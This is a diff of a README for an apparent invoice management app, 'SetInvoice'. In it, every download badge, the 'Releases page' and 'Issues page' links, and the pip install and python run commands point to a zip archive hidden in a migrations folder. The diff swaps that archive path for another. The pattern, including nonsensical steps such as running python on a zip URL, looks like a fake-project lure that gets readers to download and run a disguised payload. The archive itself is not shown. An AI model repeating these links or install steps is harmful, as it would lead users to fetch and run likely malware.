@@ -1,6 +1,6 @@
 # 🚀 SetInvoice-InvoiceManagementSystem - Simplified Invoicing for Everyone
 
-[![Download SetInvoice-InvoiceManagementSystem](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip)](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip)
+[![Download SetInvoice-InvoiceManagementSystem](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip)](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ Before you start using SetInvoice-InvoiceManagementSystem, ensure your system me
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: To download the application, visit the [Releases page](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip).
+1. **Visit the Releases Page**: To download the application, visit the [Releases page](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip).
    
 2. **Download the Latest Release**: On the releases page, find the latest version and click the download link for your operating system. 
 
@@ -41,13 +41,13 @@ Before you start using SetInvoice-InvoiceManagementSystem, ensure your system me
    Then, install the required dependencies by running:
 
    ```bash
-   pip install -r https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip
+   pip install -r https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip
    ```
 
 5. **Run the Application**: You can start the application using this command:
 
    ```bash
-   python https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip runserver
+   python https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip runserver
    ```
 
    Open your web browser and go to `http://127.0.0.1:8000` to access the application.
@@ -56,7 +56,7 @@ Before you start using SetInvoice-InvoiceManagementSystem, ensure your system me
 
 For your convenience, you can quickly download SetInvoice-InvoiceManagementSystem by clicking the link below:
 
-[![Download SetInvoice-InvoiceManagementSystem](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip)](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip)
+[![Download SetInvoice-InvoiceManagementSystem](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip)](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip)
 
 After downloading, simply follow the getting started steps above to install and run the software.
 
@@ -83,7 +83,7 @@ This application relates to several important topics in business and finance. He
 
 If you encounter issues or have questions, please reach out to our support team. You can find assistance by:
 
-- Visiting our [Issues page](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/accounts/SetInvoice-InvoiceManagementSystem-2.3.zip)
+- Visiting our [Issues page](https://raw.githubusercontent.com/Kokot-ia/SetInvoice-InvoiceManagementSystem/main/apps/inventory/migrations/Invoice_Set_Management_System_v3.3.zip)
 - Searching for similar issues or opening a new one if necessary.
 
 ## 🌍 Community
